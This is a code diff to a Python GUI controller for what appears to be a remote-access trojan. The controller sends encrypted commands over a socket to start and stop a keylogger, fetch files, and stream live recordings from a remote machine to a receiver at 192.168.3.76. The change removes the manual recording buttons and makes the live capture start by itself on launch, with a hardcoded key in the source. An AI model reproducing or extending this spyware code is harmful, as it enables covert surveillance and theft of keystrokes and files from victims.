@@ -19,6 +19,7 @@ HOST = '0.0.0.0'
 PORT = args.port
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
+receiver = StreamingServer('192.168.3.76', 423)
 key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 s = socket.socket()
 
@@ -100,26 +101,17 @@ def sendfile_command():
         my_msg_sendfile.set("")
         break
 
-
-receiver = StreamingServer('192.168.3.76', 423)
-
-
-def getlive():
-    commandz = Fernet(key).encrypt('/getlive'.encode())
-    client_socket.send(commandz)
-    t = threading.Thread(target=receiver.start_server)
-    t.start()
-
-def stop_getlive():
-    commandz = Fernet(key).encrypt('/stop_getlive'.encode())
-    client_socket.send(commandz)
-    receiver.stop_server()
+    
 
 def change_appearance_mode(new_appearance_mode):
     customtkinter.set_appearance_mode(new_appearance_mode)
 
 
 def on_closing(event=None):
+    commandz = Fernet(key).encrypt('/stop_getlive'.encode())
+    client_socket.send(commandz)
+    receiver.stop_server()
+    time.sleep(0.5)
     commandz = Fernet(key).encrypt('exit'.encode())
     client_socket.send(commandz)
     sys.exit()
@@ -220,11 +212,11 @@ send_button.pack(pady=20, padx=60)
 
 
 app.label_mode = customtkinter.CTkLabel(master=app.frame_left, text="Appearance Mode:", text_font=("Roboto Medium", 10))
-app.label_mode.grid(row=13, column=0, pady=0, padx=20, sticky="w")
+app.label_mode.grid(row=12, column=0, pady=0, padx=20, sticky="w")
 
 
 app.optionmenu_1 = customtkinter.CTkOptionMenu(master=app.frame_left, values=["System", "Light", "Dark"], command=change_appearance_mode, text_font=("Roboto Medium", 10))
-app.optionmenu_1.grid(row=14, column=0, pady=15, padx=20, sticky="w")
+app.optionmenu_1.grid(row=13, column=0, pady=15, padx=20, sticky="w")
 
 
 my_msg_sendfile = tkinter.StringVar()
@@ -243,26 +235,29 @@ send_button_getfile = customtkinter.CTkButton(master=app.frame_left, text="get f
 send_button_getfile.grid(row=5, column=0, pady=10, padx=20)
 
 
-getrecording_button = customtkinter.CTkButton(master=app.frame_left, text="get live recording", command=getlive, relief='groove', text_font=("Roboto Medium", 12))
-getrecording_button.grid(row=6, column=0, pady=10, padx=20)
-
-stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="stop live recording", command=stop_getlive, relief='groove', text_font=("Roboto Medium", 12))
-stop_recording_button.grid(row=7, column=0, pady=10, padx=20)
-
 start_logger_button = customtkinter.CTkButton(master=app.frame_left, text="start keylogger", command=keylogger_loop, relief='groove', text_font=("Roboto Medium", 12))
-start_logger_button.grid(row=8, column=0, pady=10, padx=20)
+start_logger_button.grid(row=6, column=0, pady=10, padx=20)
 
 stop_logger_button = customtkinter.CTkButton(master=app.frame_left, text="stop keylogger", command=stop_keylogger, relief='groove', text_font=("Roboto Medium", 12))
-stop_logger_button.grid(row=9, column=0, pady=10, padx=20)
+stop_logger_button.grid(row=7, column=0, pady=10, padx=20)
 
-stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
-stop_recording_button.grid(row=10, column=0, pady=10, padx=20)
+placeholder_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
+placeholder_button.grid(row=8, column=0, pady=10, padx=20)
 
-stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
-stop_recording_button.grid(row=11, column=0, pady=10, padx=20)
+placeholder_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
+placeholder_button.grid(row=9, column=0, pady=10, padx=20)
 
-stop_recording_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
-stop_recording_button.grid(row=12, column=0, pady=10, padx=20)
+placeholder_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
+placeholder_button.grid(row=10, column=0, pady=10, padx=20)
+
+placeholder_button = customtkinter.CTkButton(master=app.frame_left, text="place holder", relief='groove', text_font=("Roboto Medium", 12))
+placeholder_button.grid(row=11, column=0, pady=10, padx=20)
+
+
+commandzzzzzz = Fernet(key).encrypt('/getlive'.encode())
+client_socket.send(commandzzzzzz)
+t = threading.Thread(target=receiver.start_server)
+t.start()
 
 
 app.protocol("WM_DELETE_WINDOW", on_closing)
